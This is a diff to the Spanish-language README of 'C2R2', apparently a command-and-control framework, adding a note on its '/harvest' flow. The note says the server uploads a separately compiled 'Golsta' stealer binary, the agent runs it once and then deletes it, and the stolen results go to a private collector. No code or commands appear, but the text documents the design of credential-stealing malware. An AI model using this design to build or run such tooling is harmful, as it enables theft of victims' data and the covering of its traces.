@@ -1,5 +1,11 @@
 # C2R2 - Arquitectura Modular con Stealer DLL
 
+> **Estado actual de `/harvest`:** el flujo operativo usa un binario Golsta
+> compilado externamente (`modules/golsta.exe`). El servidor lo sube, el agente
+> lo ejecuta una vez y lo elimina; los resultados van al collector privado de
+> Golsta y se consultan desde C2R2 mediante `/api/golsta/*`.
+> Las secciones de `stealer.enc` siguientes documentan la arquitectura legacy.
+
 ##  Concepto
 
 El agent de C2R2 es **ligero y modular**. Solo incluye funcionalidad básica del C2 (~500 KB) y ejecuta el stealer bajo demanda cuando se necesita.
